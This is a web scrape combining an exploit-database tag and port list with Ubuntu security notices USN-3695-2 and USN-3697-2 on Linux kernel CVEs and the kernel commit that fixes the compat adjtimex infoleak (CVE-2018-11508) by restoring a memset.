
8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from bugs.chromium.org_68338b01_20250125_093050.html ===



=== Content from usn.ubuntu.com_d66a278e_20250125_093052.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3695-2: Linux kernel (HWE) vulnerabilities

2 July 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [linux-azure](/security/cves?package=linux-azure) - Linux kernel for Microsoft Azure Cloud systems
* [linux-hwe](/security/cves?package=linux-hwe) - Linux hardware enablement (HWE) kernel

## Details

USN-3695-1 fixed vulnerabilities in the Linux kernel for Ubuntu 18.04

LTS. This update provides the corresponding updates for the Linux

Hardware Enablement (HWE) kernel from Ubuntu 18.04 LTS for Ubuntu

16.04 LTS.

Wen Xu discovered that the ext4 file system implementation in the Linux

kernel did not properly initialize the crc32c checksum driver. A local

attacker could use this to cause a denial of service (system crash).

([CVE-2018-1094](/security/CVE-2018-1094))

It was discovered that the cdrom driver in the Linux kernel contained an

incorrect bounds check. A local attacker could use this to expose sensitive

information (kernel memory). ([CVE-2018-10940](/security/CVE-2018-10940))

Wen Xu discovered that the ext4 file system implementation in the Linux

kernel did not properly validate xattr sizes. A local attacker could use

this to cause a denial of service (system crash). ([CVE-2018-1095](/security/CVE-2018-1095))

Jann Horn discovered that the 32 bit adjtimex() syscall implementation for

64 bit Linux kernels did not properly initialize memory returned to user

space in some situations. A local attacker could use this to expose

sensitive information (kernel memory). ([CVE-2018-11508](/security/CVE-2018-11508))

It was discovered that an information leak vulnerability existed in the

floppy driver in the Linux kernel. A local attacker could use this to

expose sensitive information (kernel memory). ([CVE-2018-7755](/security/CVE-2018-7755))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [linux-image-4.15.0-24-generic](https://launchpad.net/ubuntu/%2Bsource/linux-hwe)
  -
  [4.15.0-24.26~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.15.0-24.26~16.04.1)
* [linux-image-4.15.0-24-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux-hwe)
  -
  [4.15.0-24.26~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.15.0-24.26~16.04.1)
* [linux-image-4.15.0-24-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux-hwe)
  -
  [4.15.0-24.26~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.15.0-24.26~16.04.1)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-1094](/security/CVE-2018-1094)
* [CVE-2018-10940](/security/CVE-2018-10940)
* [CVE-2018-1095](/security/CVE-2018-1095)
* [CVE-2018-11508](/security/CVE-2018-11508)
* [CVE-2018-7755](/security/CVE-2018-7755)

## Related notices

* [USN-3695-1](/security/notices/USN-3695-1)
* [USN-3676-1](/security/notices/USN-3676-1)
* [USN-3676-2](/security/notices/USN-3676-2)
* [USN-3754-1](/security/notices/USN-3754-1)
* [USN-3697-1](/security/notices/USN-3697-1)
* [USN-3697-2](/security/notices/USN-3697-2)
* [USN-3698-2](/security/notices/USN-3698-2)
* [USN-3698-1](/security/notices/USN-3698-1)
* [USN-3696-2](/security/notices/USN-3696-2)
* [USN-3696-1](/security/notices/USN-3696-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from github.com_c248fe8c_20250125_093051.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F0a0b98734479aa5b3c671d5190e86273372cab95)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F0a0b98734479aa5b3c671d5190e86273372cab95)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=torvalds%2Flinux)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[torvalds](/torvalds)
/
**[linux](/torvalds/linux)**
Public

* [Notifications](/login?return_to=%2Ftorvalds%2Flinux) You must be signed in to change notification settings
* [Fork
  54.9k](/login?return_to=%2Ftorvalds%2Flinux)
* [Star
   186k](/login?return_to=%2Ftorvalds%2Flinux)

* [Code](/torvalds/linux)
* [Pull requests
  437](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects
  0](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

Additional navigation options

* [Code](/torvalds/linux)
* [Pull requests](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

## Commit

[Permalink](/torvalds/linux/commit/0a0b98734479aa5b3c671d5190e86273372cab95)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

compat: fix 4-byte infoleak via uninitialized struct field

[Browse files](/torvalds/linux/tree/0a0b98734479aa5b3c671d5190e86273372cab95)
Browse the repository at this point in the history

```
Commit [3a4d44b](https://github.com/torvalds/linux/commit/3a4d44b6162555070194e486ff6b3799a8d323a2) ("ntp: Move adjtimex related compat syscalls to
native counterparts") removed the memset() in compat_get_timex().  Since
then, the compat adjtimex syscall can invoke do_adjtimex() with an
uninitialized ->tai.

If do_adjtimex() doesn't write to ->tai (e.g.  because the arguments are
invalid), compat_put_timex() then copies the uninitialized ->tai field
to userspace.

Fix it by adding the memset() back.

Fixes: [3a4d44b](https://github.com/torvalds/linux/commit/3a4d44b6162555070194e486ff6b3799a8d323a2) ("ntp: Move adjtimex related compat syscalls to native counterparts")
Signed-off-by: Jann Horn <jannh@google.com>
Acked-by: Kees Cook <keescook@chromium.org>
Acked-by: Al Viro <viro@zeniv.linux.org.uk>
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
```

* Loading branch information

[![@thejh](https://avatars.githubusercontent.com/u/499370?s=40&v=4)](/thejh) [![@torvalds](https://avatars.githubusercontent.com/u/1024025?s=40&v=4)](/torvalds)

[thejh](/torvalds/linux/commits?author=thejh "View all commits by thejh")
authored and
[torvalds](/torvalds/linux/commits?author=torvalds "View all commits by torvalds")
committed
May 11, 2018

1 parent
[94d7dbf](/torvalds/linux/commit/94d7dbf108813ea45a91e27e9a8bd231d5a23fa7)

commit 0a0b987

Showing
**1 changed file**
with
**1 addition**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

1 change: 1 addition & 0 deletions

1
[kernel/compat.c](#diff-d27fc95232d669c8306ebf2dc7dc37c503a90ec41f038d94b4a77fb7e3f9e376 "kernel/compat.c")

Show comments

[View file](/torvalds/linux/blob/0a0b98734479aa5b3c671d5190e86273372cab95/kernel/compat.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -34,6 +34,7 @@ int compat\_get\_timex(struct timex \*txc, const struct compat\_timex \_\_user \*utp) |
|  |  | { |
|  |  | struct compat\_timex tx32; |
|  |  |  |
|  |  | memset(txc, 0, sizeof(struct timex)); |
|  |  | if (copy\_from\_user(&tx32, utp, sizeof(struct compat\_timex))) |
|  |  | return -EFAULT; |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `0a0b987`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F0a0b98734479aa5b3c671d5190e86273372cab95) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from git.kernel.org_5f05ab21_20250125_093050.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=0a0b98734479aa5b3c671d5190e86273372cab95)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=0a0b98734479aa5b3c671d5190e86273372cab95)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0a0b98734479aa5b3c671d5190e86273372cab95)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=0a0b98734479aa5b3c671d5190e86273372cab95)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Jann Horn <jannh@google.com> | 2018-05-11 02:19:01 +0200 |
| --- | --- | --- |
| committer | Linus Torvalds <torvalds@linux-foundation.org> | 2018-05-10 17:51:58 -0700 |
| commit | [0a0b98734479aa5b3c671d5190e86273372cab95](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0a0b98734479aa5b3c671d5190e86273372cab95) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=0a0b98734479aa5b3c671d5190e86273372cab95)) | |
| tree | [d5b5f0604c0cd3ea41bdcf5c1eda8793bc720129](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=0a0b98734479aa5b3c671d5190e86273372cab95) | |
| parent | [94d7dbf108813ea45a91e27e9a8bd231d5a23fa7](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=94d7dbf108813ea45a91e27e9a8bd231d5a23fa7) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=0a0b98734479aa5b3c671d5190e86273372cab95&id2=94d7dbf108813ea45a91e27e9a8bd231d5a23fa7)) | |
| download | [linux-0a0b98734479aa5b3c671d5190e86273372cab95.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-0a0b98734479aa5b3c671d5190e86273372cab95.tar.gz) | |

compat: fix 4-byte infoleak via uninitialized struct fieldCommit 3a4d44b61625 ("ntp: Move adjtimex related compat syscalls to
native counterparts") removed the memset() in compat\_get\_timex(). Since
then, the compat adjtimex syscall can invoke do\_adjtimex() with an
uninitialized ->tai.
If do\_adjtimex() doesn't write to ->tai (e.g. because the arguments are
invalid), compat\_put\_timex() then copies the uninitialized ->tai field
to userspace.
Fix it by adding the memset() back.
Fixes: 3a4d44b61625 ("ntp: Move adjtimex related compat syscalls to native counterparts")
Signed-off-by: Jann Horn <jannh@google.com>
Acked-by: Kees Cook <keescook@chromium.org>
Acked-by: Al Viro <viro@zeniv.linux.org.uk>
Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=0a0b98734479aa5b3c671d5190e86273372cab95)

| -rw-r--r-- | [kernel/compat.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/kernel/compat.c?id=0a0b98734479aa5b3c671d5190e86273372cab95) | 1 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 1 insertions, 0 deletions

| diff --git a/kernel/compat.c b/kernel/compat.cindex 6d21894806b46f..92d8c98c0f57ac 100644--- a/[kernel/compat.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/compat.c?id=94d7dbf108813ea45a91e27e9a8bd231d5a23fa7)+++ b/[kernel/compat.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/compat.c?id=0a0b98734479aa5b3c671d5190e86273372cab95)@@ -34,6 +34,7 @@ int compat\_get\_timex(struct timex \*txc, const struct compat\_timex \_\_user \*utp) { struct compat\_timex tx32; + memset(txc, 0, sizeof(struct timex)); if (copy\_from\_user(&tx32, utp, sizeof(struct compat\_timex))) return -EFAULT; |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-25 09:29:27 +0000



=== Content from usn.ubuntu.com_09872871_20250125_093053.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3697-2: Linux kernel (OEM) vulnerabilities

2 July 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [linux-oem](/security/cves?package=linux-oem) - Linux kernel for OEM processors

## Details

It was discovered that a null pointer dereference vulnerability existed in

the DCCP protocol implementation in the Linux kernel. A local attacker

could use this to cause a denial of service (system crash). ([CVE-2018-1130](/security/CVE-2018-1130))

Jann Horn discovered that the 32 bit adjtimex() syscall implementation for

64 bit Linux kernels did not properly initialize memory returned to user

space in some situations. A local attacker could use this to expose

sensitive information (kernel memory). ([CVE-2018-11508](/security/CVE-2018-11508))

Wang Qize discovered that an information disclosure vulnerability existed

in the SMBus driver for ACPI Embedded Controllers in the Linux kernel. A

local attacker could use this to expose sensitive information (kernel

pointer addresses). ([CVE-2018-5750](/security/CVE-2018-5750))

It was discovered that the SCTP Protocol implementation in the Linux kernel

did not properly validate userspace provided payload lengths in some

situations. A local attacker could use this to cause a denial of service

(system crash). ([CVE-2018-5803](/security/CVE-2018-5803))

It was discovered that an integer overflow error existed in the futex

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (system crash). ([CVE-2018-6927](/security/CVE-2018-6927))

It was discovered that an information leak vulnerability existed in the

floppy driver in the Linux kernel. A local attacker could use this to

expose sensitive information (kernel memory). ([CVE-2018-7755](/security/CVE-2018-7755))

It was discovered that a memory leak existed in the SAS driver subsystem of

the Linux kernel. A local attacker could use this to cause a denial of

service (memory exhaustion). ([CVE-2018-7757](/security/CVE-2018-7757))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [linux-image-4.13.0-1031-oem](https://launchpad.net/ubuntu/%2Bsource/linux-oem)
  -
  [4.13.0-1031.35](https://launchpad.net/ubuntu/%2Bsource/linux-oem/4.13.0-1031.35)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-1130](/security/CVE-2018-1130)
* [CVE-2018-11508](/security/CVE-2018-11508)
* [CVE-2018-5750](/security/CVE-2018-5750)
* [CVE-2018-5803](/security/CVE-2018-5803)
* [CVE-2018-6927](/security/CVE-2018-6927)
* [CVE-2018-7755](/security/CVE-2018-7755)
* [CVE-2018-7757](/security/CVE-2018-7757)

## Related notices

* [USN-3654-2](/security/notices/USN-3654-2)
* [USN-3698-2](/security/notices/USN-3698-2)
* [USN-3654-1](/security/notices/USN-3654-1)
* [USN-3656-1](/security/notices/USN-3656-1)
* [USN-3697-1](/security/notices/USN-3697-1)
* [USN-3698-1](/security/notices/USN-3698-1)
* [USN-3695-2](/security/notices/USN-3695-2)
* [USN-3695-1](/security/notices/USN-3695-1)
* [USN-3631-2](/security/notices/USN-3631-2)
* [USN-3631-1](/security/notices/USN-3631-1)
* [USN-3619-2](/security/notices/USN-3619-2)
* [USN-3619-1](/security/notices/USN-3619-1)
* [USN-3696-2](/security/notices/USN-3696-2)
* [USN-3696-1](/security/notices/USN-3696-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
